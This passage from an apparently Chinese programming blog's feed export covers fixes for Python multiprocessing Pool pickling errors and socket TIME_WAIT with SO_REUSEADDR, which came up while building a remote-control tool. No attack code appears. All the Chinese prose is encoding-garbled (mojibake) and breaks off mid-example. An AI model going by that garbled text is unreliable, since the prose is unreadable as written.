æŒ‡å®šå¯¹è±¡çŠ¶æ€çš„å“ªä¸€éƒ¨åˆ†å®é™…ä¸Šåº”è¯¥è¢«pickleã€‚ç„¶ååœ¨unpickleæ—¶ï¼Œ<code>__setstate__(state)</code>å°†è¢«è°ƒç”¨ï¼Œå¦‚æœå®ƒå®ç°äº†(åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­)ï¼Œæˆ–è€…å¦‚æœå®ƒæ²¡æœ‰ï¼Œç”±<code>__getstate__</code>è¿”å›çš„dictå°†è¢«ç”¨ä½œunpickleå®ä¾‹çš„<code>__dict__</code>ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ˜¾å¼åœ°è®¾ç½®äº†dictçš„<code>__dict__</code>ï¼Œæˆ‘ä»¬åœ¨<code>__getstate__</code>è¿”å›ï¼Œä½†æˆ‘ä»¬æœ¬å¯ä»¥ä¸å®ç°<code>__setstate__</code>å’Œå¾—åˆ°ç›¸åŒçš„æ•ˆæœã€‚</p><p>åŠ å…¥<code>__getstate__</code>å’Œ<code>__setstate__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self_dict = self.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&#x27;pool&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> self_dict</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, state</span>):</span></span><br><span class="line">        self.__dict__.update(state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>å¯æˆåŠŸæ‰§è¡Œï¼Œè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¸­æ·»åŠ è¾“å‡ºä»£ç ï¼ŒæŸ¥çœ‹æ¯æ¬¡æ‰§è¡Œåçš„pickleå¯¹è±¡å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">    self_dict = self.__dict__.copy()</span><br><span class="line">    print(self.__dict__)</span><br><span class="line">    <span class="keyword">del</span> self_dict[<span class="string">&#x27;pool&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> self_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, state</span>):</span></span><br><span class="line">    self.__dict__.update(state)</span><br><span class="line">    print(self.__dict__)</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2021/01/05/1609817181.png" alt="1608635655066.png"></p><p>é€šè¿‡æ‰“å°å¯çŸ¥ï¼Œä½¿ç”¨<code>del self_dict[&#39;pool&#39;]</code>åå°†å­—å…¸ä¸­çš„Poolå¯¹è±¡åˆ é™¤ï¼Œç„¶åå†å°†å¾—åˆ°çš„å­—å…¸ä¼ ç»™<code>__setstate__(self, state)</code>ï¼Œè¿™æ ·pickleçš„å†…å®¹å°±ä¸ä¼šåŒ…å«Poolå¯¹è±¡ã€‚</p><h3 id="æ–¹æ³•äºŒï¼šä½¿ç”¨pathosæ¨¡å—ä»£æ›¿multiprocessingçš„Pool"><a href="#æ–¹æ³•äºŒï¼šä½¿ç”¨pathosæ¨¡å—ä»£æ›¿multiprocessingçš„Pool" class="headerlink" title="æ–¹æ³•äºŒï¼šä½¿ç”¨pathosæ¨¡å—ä»£æ›¿multiprocessingçš„Pool"></a>æ–¹æ³•äºŒï¼šä½¿ç”¨pathosæ¨¡å—ä»£æ›¿multiprocessingçš„Pool</h3><p>pipå®‰è£…pathoså¹¶è¡Œè®¡ç®—æ¨¡å—ï¼Œä½¿ç”¨pathosæ¨¡å—çš„ProcessPoolæ¥ä»£æ›¿multiprocessingçš„Poolï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathos.pools <span class="keyword">import</span> ProcessPool <span class="keyword">as</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>å¯æˆåŠŸæ‰§è¡Œï¼Œè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰ï¼šä¸å°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§"><a href="#æ–¹æ³•ä¸‰ï¼šä¸å°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šä¸å°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§"></a>æ–¹æ³•ä¸‰ï¼šä¸å°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§</h3><p>ä¸Šæ–‡æåˆ°ï¼Œå½“pickleå®ä¾‹æ–¹æ³•æ—¶ï¼ŒPythonéœ€è¦pickleæ•´ä¸ªå¯¹è±¡ï¼Œå¦‚æœå°†Poolå¯¹è±¡å†™å…¥ç±»å±æ€§è¿›è¡Œä¼ é€’ï¼Œåˆ™ä¹ŸåŒ…æ‹¬Poolå¯¹è±¡ã€‚å› æ­¤ä¿®æ”¹ä»£ç ï¼Œå°†Poolå¯¹è±¡å•ç‹¬å†™è¿›runå‡½æ•°ï¼Œè€Œä¸å†™å…¥ç±»å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pool = Pool()<span class="comment"># ä¸å†™å…¥ç±»å±æ€§</span></span><br><span class="line">        pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>å¯æˆåŠŸæ‰§è¡Œï¼Œè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•å››ï¼šä½¿ç”¨-staticmethodé™æ€è£…é¥°å™¨"><a href="#æ–¹æ³•å››ï¼šä½¿ç”¨-staticmethodé™æ€è£…é¥°å™¨" class="headerlink" title="æ–¹æ³•å››ï¼šä½¿ç”¨@staticmethodé™æ€è£…é¥°å™¨"></a>æ–¹æ³•å››ï¼šä½¿ç”¨@staticmethodé™æ€è£…é¥°å™¨</h3><p>æºè‡ªStack Overflowä¸Šå¸ˆå‚…çš„å›ç­”ï¼Œå›ç­”ä¸­æåˆ°çš„Danoâ€™s answerå…¶å®å°±æ˜¯ä¸Šè¿°æ–¹æ³•ä¸€</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2021/01/05/1609817192.png" alt="1608640733012.png"></p><p>@staticmethodç§°ä¸ºé™æ€è£…é¥°å™¨ï¼Œé€šå¸¸ç±»æ–¹æ³•éœ€è¦åœ¨å®ä¾‹åŒ–ç±»ä¹‹åæ‰å¯è°ƒç”¨ï¼Œè€ŒåŠ äº†é™æ€ä¿®é¥°ç¬¦åçš„å‡½æ•°ï¼Œä¸éœ€è¦å®ä¾‹åŒ–ç±»å³å¯è°ƒç”¨ï¼Œç›´æ¥<code>ç±»å.æ–¹æ³•å()</code>å³å¯ï¼Œè¿™æ˜¯å› ä¸ºé™æ€è£…é¥°å™¨å…¶å®æ˜¯å¯¹å¤–éƒ¨å‡½æ•°çš„é™æ€å°è£…ï¼Œå‡½æ•°å†…éƒ¨å¹¶ä¸éœ€è¦è¡¨ç¤ºè‡ªèº«å¯¹è±¡çš„selfå’Œè‡ªèº«ç±»çš„clså‚æ•°ã€‚</p><p>ä¸ºprintTest()å‡½æ•°æ·»åŠ è£…é¥°å™¨ï¼Œrun()ä¸­æ­£å¸¸åˆ›å»ºPoolç±»å±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>å¯æˆåŠŸæ‰§è¡Œï¼Œè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äº”ï¼šå£°æ˜å…¨å±€å˜é‡pool-Pool"><a href="#æ–¹æ³•äº”ï¼šå£°æ˜å…¨å±€å˜é‡pool-Pool" class="headerlink" title="æ–¹æ³•äº”ï¼šå£°æ˜å…¨å±€å˜é‡pool = Pool()"></a>æ–¹æ³•äº”ï¼šå£°æ˜å…¨å±€å˜é‡pool = Pool()</h3><p>ä¸æ–¹æ³•äºŒå¯¹åº”çš„æ˜¯ï¼Œå¯ä»¥é€šè¿‡globalæ¥åœ¨å¤–éƒ¨å£°æ˜ä¸€ä¸ªå…¨å±€çš„å˜é‡<code>pool = Pool()</code>ï¼ŒåŒæ ·å¯ä»¥å®ç°ï¼Œä½†æ˜¯æ­¤æ–¹æ³•ä¸å¤Ÿæ¨¡å—åŒ–ï¼Œæ„Ÿjioåç¦»äº†é¢å‘å¯¹è±¡çš„æ€ç»´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, dstPort</span>):</span></span><br><span class="line">        print(dstPort)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">global</span> pool<span class="comment"># å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡</span></span><br><span class="line">    pool = Pool()</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>å¯æˆåŠŸæ‰§è¡Œï¼Œè¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•å…­ï¼šä½¿ç”¨ThreadPoolä»£æ›¿multiprocessing-Pool"><a href="#æ–¹æ³•å…­ï¼šä½¿ç”¨ThreadPoolä»£æ›¿multiprocessing-Pool" class="headerlink" title="æ–¹æ³•å…­ï¼šä½¿ç”¨ThreadPoolä»£æ›¿multiprocessing.Pool"></a>æ–¹æ³•å…­ï¼šä½¿ç”¨ThreadPoolä»£æ›¿multiprocessing.Pool</h3><p>ä½¿ç”¨<code>multiprocessing.pool çš„ ThreadPool</code>ä»£æ›¿<code>multiprocessing.Pool</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool <span class="keyword">as</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p> å› ä¸º ThreadPool ä¸ä¸»çº¿ç¨‹å…±äº«å†…å­˜ï¼Œè€Œä¸æ˜¯åˆ›å»ºæ–°è¿›ç¨‹ï¼Œè¿™æ„å‘³ç€ä¸éœ€è¦è¢«pickleã€‚ </p><p>ä½†æ˜¯è¿™ç§æ–¹å¼ä¼šè§¦å‘GILï¼Œä¸èƒ½å……åˆ†åˆ©ç”¨CPUèµ„æºã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://stackoverflow.com/questions/25382455/python-notimplementederror-pool-objects-cannot-be-passed-between-processes">https://stackoverflow.com/questions/25382455/python-notimplementederror-pool-objects-cannot-be-passed-between-processes</a></p><p><strong>pickleï¼š</strong><a href="https://www.cnblogs.com/cobbliu/archive/2012/09/04/2670178.html">https://www.cnblogs.com/cobbliu/archive/2012/09/04/2670178.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonè¿›ç¨‹æ±  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså’ŒLinuxä¸Šsocketçš„ç»ˆæ­¢é—®é¢˜ï¼ˆtime_waitï¼‰</title>
      <link href="post/20201222133.html"/>
      <url>post/20201222133.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨ç¼–å†™è¿œæ§å·¥å…·DanceShellçš„shellè¿æ¥éƒ¨åˆ†ï¼ŒåŠŸèƒ½éœ€æ±‚æ˜¯å½“æœ¬æ¬¡è¿æ¥ç»ˆæ­¢æ—¶ï¼Œè‡ªåŠ¨å¯åŠ¨socketç›‘å¬ï¼Œä¾ç„¶æ˜¯åœ¨æ­¤å‰çš„IPå’Œç«¯å£è¿›è¡Œç›‘å¬ï¼Œå¹¶ä¸”åœ¨ç›‘å¬å‰å…³é—­socketè¿æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clientSocket.shutdown(2)</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨Windowsä¸Šè¿è¡Œå¹¶æ–­å¼€é‡å¤ç›‘å¬æ—¶æ˜¯æˆåŠŸçš„ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image1.png" alt="image1"></p><p>ä½†æ˜¯åŒæ ·çš„é¡¹ç›®ä»£ç ï¼Œåœ¨Linuxå°±ä¼šæŠ¥é”™ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image2.png" alt="image2"></p><p>æŠ›å‡ºæ¥è¿™æ ·çš„é”™è¯¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;server.py&quot;, line 67, in &lt;module&gt;       </span><br><span class="line">    main()           </span><br><span class="line">  File &quot;server.py&quot;, line 35, in main </span><br><span class="line">    server, clientSocket, clientAddress = connect(host, port)</span><br><span class="line">  File &quot;server.py&quot;, line 19, in connect</span><br><span class="line">    server.bind((serverHost, serverPort))</span><br><span class="line">OSError: [Errno 98] Address already in use</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ˜¾ç¤ºåœ°å€å·²ç»è¢«ä½¿ç”¨ï¼Œæ— æ³•å†æ¬¡è¿›è¡Œsocket bind()ç»‘å®šã€‚</p><p>èµ·åˆä»¥ä¸ºæ˜¯ä»…ä»…ç»ˆæ­¢äº†clientSocketè€Œæ²¡æœ‰ç»“æŸï¼ˆå…³é—­ï¼‰serverSocketï¼Œäºæ˜¯åœ¨å…³é—­clientSocketååˆåŠ å…¥ä¸€è¡Œå…³é—­serverSocketçš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientSocket.shutdown(2)</span><br><span class="line">clientSocket.close()</span><br><span class="line">server.close()</span><br></pre></td></tr></table></figure><p>Windowsä¸ŠåŒæ ·å¯ä»¥ï¼Œä½†æ˜¯Linuxä¸Šè¿è¡Œï¼Œå…³é—­å†æ¬¡ç›‘å¬ä¾ç„¶ä¼šæŠ¥é”™ã€‚</p><p>å½“æˆ‘ä»¥ä¸ºä»…ä»…æ˜¯Windowså’ŒLinuxä¸åŒæ“ä½œç³»ç»Ÿä¸Šçš„socketå­˜åœ¨å·®å¼‚æ—¶ï¼ŒæŸ¥è¯¢èµ„æ–™å¾—çŸ¥ï¼ŒWindowså’ŒLinuxä¸Šç¬¬ä¸€æ¬¡å…³é—­socketè¿æ¥å¹¶<strong>ä¸ä¼šç«‹å³é‡Šæ”¾åœ°å€å’Œç«¯å£</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šç«‹å³é‡Šæ”¾è¯¥socketï¼ˆip:portï¼‰ï¼Œè€Œæ˜¯å¤„äº<strong>time_wait</strong>çš„ä¸€ä¸ªçŠ¶æ€</p><p>å…³äºè¯¥çŠ¶æ€çš„å«ä¹‰ï¼Œä¹¦ç±ã€ŠTCP/IPè¯¦è§£å·ã€‹ä¸­ç»™å‡ºçš„è§£é‡Šæ˜¯ï¼Œç”±äºTCPè¿æ¥å­˜åœ¨ä¸€ä¸ªæœ€å¤§æ®µç”Ÿå­˜æœŸMSLï¼ˆMaximum Segment Lifetimeï¼‰ï¼Œå®ƒä»£è¡¨ä»»ä½•æŠ¥æ–‡æ®µåœ¨è¢«ä¸¢å¼ƒå‰åœ¨ç½‘ç»œä¸­è¢«å…è®¸å­˜åœ¨çš„æœ€å¤§æ—¶é•¿ï¼Œè€Œå½“è¿æ¥æ–­å¼€æ—¶ï¼Œä¸ºäº†é˜²æ­¢å¯èƒ½å­˜åœ¨äºç½‘ç»œä¸­çš„çš„æ•°æ®åŒ…ï¼Œåœ¨é‡æ–°å»ºç«‹æ–°è¿æ¥åè¢«å½“ä½œæ–°è¿æ¥çš„æ•°æ®æŠ¥æ–‡ï¼Œæ‰€ä»¥ä¼šè®¾å®šä¸€ä¸ªtime_waitï¼Œä¹Ÿç§°ä¹‹ä¸º2MSLï¼Œå³æ—¶é•¿æ˜¯MSLçš„2å€ã€‚æ‰€ä»¥<strong>åœ¨è¿™2MSLçš„time_waitæ—¶é—´å†…ï¼Œè¯¥åœ°å€ç«¯å£ä¸å…è®¸å†æ¬¡ç»‘å®šä½¿ç”¨</strong>ã€‚</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image3.png" alt="image3"></p><p>Windowsä¸Štime_waitçš„æ—¶é—´æ˜¯30-300sï¼Œä¸åŒçš„ç‰ˆæœ¬æœ‰ä¸åŒçš„é»˜è®¤å€¼ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿç«‹å³å†æ¬¡ç»‘å®šæ­¤å‰çš„ç«¯å£ï¼ˆsocketï¼‰ï¼Œå½“é‡åˆ°ä»¥ä¸‹ä¸¤ç§æƒ…å†µæ—¶ï¼Œæ‰ä¼šå®Œå…¨é‡Šæ”¾ï¼š</p><ul><li>1ã€ç¨‹åºç»“æŸ</li><li>2ã€time_waitç»“æŸ</li></ul><p>ä½†æ˜¯ï¼Œç”±äºåœ¨å®é™…åº”ç”¨ä¸­ï¼ŒæœåŠ¡ç«¯åŒä¸€æœåŠ¡æ‰€ç›‘å¬çš„ç«¯å£é€šå¸¸æ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚80ã€443ç­‰ï¼Œå¦‚æœæœåŠ¡ç«¯ç»ˆæ­¢äº†å·²ç»å»ºç«‹è¿æ¥çš„æœåŠ¡å™¨è¿›ç¨‹ï¼Œæ­¤æ—¶éœ€è¦ç«‹åˆ»æ¢å¤ç›‘å¬ï¼Œè€ŒTCPå¤„äºtime_waitçŠ¶æ€ï¼Œæ— æ³•ç«‹åˆ»å†æ¬¡ç›‘å¬ç›¸åŒç«¯å£ï¼Œéœ€è¦ç­‰å¾…2MSLï¼Œè¿™ä¼šå¤§å¤§é™ä½æœåŠ¡å™¨çš„æ•ˆç‡ï¼Œå½±å“æ­£å¸¸çš„æœåŠ¡ã€‚æ‰€ä»¥é’ˆå¯¹æ­¤é—®é¢˜ï¼Œä¹‹ååˆæå‡ºäº†<strong>socketåœ°å€å¤ç”¨</strong>ï¼ˆ<code>SO_REUSEADDR</code>ï¼‰ã€‚</p><p><code>SO_REUSEADDR</code>åœ°å€å¤ç”¨å°±æ˜¯ä¸ºäº†ç»•è¿‡time_waitè¿™ä¸ª2MSLç­‰å¾…æ—¶é—´è€Œè®¾å®šçš„é€‰é¡¹ï¼Œæ‰€ä»¥å®ƒçš„ä½œç”¨èŒƒå›´ä»…ä»…æ˜¯å‡ºäºtime_waitçŠ¶æ€çš„socketã€‚åœ¨bind()ä¹‹å‰<strong>ä½¿ç”¨setsockopt()å‡½æ•°æ¥è®¾å®šsocketå‚æ•°</strong>ï¼ŒPythonç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡å™¨ç«¯åŠ å…¥è¯¥ä»£ç ï¼Œä»£ç å—éƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">host, port</span>):</span></span><br><span class="line">  serverHost = host</span><br><span class="line">  serverPort = 